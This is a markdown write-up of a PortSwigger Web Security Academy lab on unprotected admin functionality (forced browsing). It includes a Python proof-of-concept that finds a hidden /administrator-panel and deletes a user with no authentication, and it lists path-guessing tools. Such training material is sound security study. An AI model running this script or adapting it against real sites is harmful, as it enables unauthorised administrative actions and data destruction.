access-control/01-unprotected-admin-panel.md
# Unprotected Admin Functionality — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-07-25

## The Problem

The application had an admin panel accessible at a path like `/administrator-panel`. This page was not linked anywhere in the normal user interface, so the developers assumed no one would find it (security through obscurity).

However, the server never checked:
- Whether the user was logged in at all (**authentication check**)
- Whether the logged-in user actually had admin privileges (**authorization check**)

## Discovery / Exploitation

By simply changing the URL path from a normal page (e.g. `/log...`) to `/administrator-panel` directly in the browser, the admin panel loaded with no login prompt and no permission check. This gave full admin access without needing any credentials.

## Impact

Anyone — including users with no account at all — could reach the admin panel by:
- Guessing common admin paths (`/admin`, `/admin-panel`, `/backend`, etc.)
- Using tools like Gobuster or Dirbuster to brute-force hidden paths
- Finding the path leaked in JavaScript source, sitemap.xml, or robots.txt

This is a critical vulnerability since it grants full administrative control over the application to any attacker.

## Proof of Concept (Python)

This script (provided by the trainer) automates the discovery and exploitation of the vulnerability. It routes traffic through Burp Suite (`127.0.0.1:8080`) so requests can be inspected, then checks if `/administrator-panel` exists, and if so, uses it to delete a user (`wiener`) without any authentication.

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning
)

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}


def delete_user(url):

    admin_panel_url = url + '/administrator-panel'

    r = requests.get(
        admin_panel_url,
        verify=False,
        proxies=proxies
    )

    if r.status_code == 200:

        print("(+) found administrator-panel")

        delete_user_url = admin_panel_url + '/delete?username=wiener'

        r = requests.get(
            delete_user_url,
            verify=False,
            proxies=proxies
        )

        if r.status_code == 200:
            print("wiener deleted")

        else:
            print("could not delete user")

    else:
        print("administrator panel not found")


def main():

    if len(sys.argv) != 2:
        print("usage: %s <url>" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]

    print("(+) finding admin panel")

    delete_user(url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Sends a GET request to `/administrator-panel` through the Burp proxy
3. If the response is `200 OK`, it confirms the admin panel exists and is reachable with no authentication
4. It then sends a second request to `/administrator-panel/delete?username=wiener` — deleting a user with zero login or privilege check
5. Prints whether the deletion succeeded

## Remediation

The server must verify, on every request to the admin functionality:
1. The user is authenticated (logged in)
2. The user's role is explicitly `admin`

Hiding a link in the UI is not access control — access control has to be enforced server-side, on every request, regardless of whether the URL is "secret."

## Takeaway

This is a classic example of Broken Access Control (OWASP Top 10 #1) — specifically **unprotected admin functionality** / **forced browsing**. Relying on obscurity instead of real authorization checks is a common but dangerous mistake in real-world applications.
